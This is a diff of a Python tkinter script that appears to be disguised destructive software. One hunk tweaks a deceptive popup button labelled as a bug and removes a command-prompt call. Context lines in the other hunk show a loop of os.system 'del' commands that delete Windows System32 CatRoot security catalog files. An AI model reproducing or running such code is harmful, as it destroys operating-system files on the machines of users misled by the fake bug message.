@@ -48,13 +48,13 @@ canvas1 = tk.Canvas(root, width = 300, height = 300, bg = 'gray90', relief = 'ra
 
 canvas1.pack()
 
+# Fix a the "Please touch the exit button,\n this window popped up as bug" appeared very large.
 
-def myCmd():
-    os.system('Start cmd /k "color a & date"')
+# eliminated the ability for the program to pop up a cmd or command prompt when doing the tk command.
 
-
-button1 = tk.Button(text='       Please touch the exit button, this window popped up as bug      ', command=myCmd, bg='green', fg='white',
+button1 = tk.Button(text='       Please touch the exit button,\n this window popped up as bug      ', bg='green', fg='white',
                     font=('helvetica', 12, 'bold'))
+
 canvas1.create_window(150, 150, window=button1)
 
 root.mainloop()
@@ -183,6 +183,8 @@ while True:
                                                 os.system.__call__("del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1.CAT")
                                                 os.system.__call__("del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1A.CAT")
                                                 os.system.__call__("del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1B.CAT")
+
+# This empty space is for space to finish this large project
 
 
 
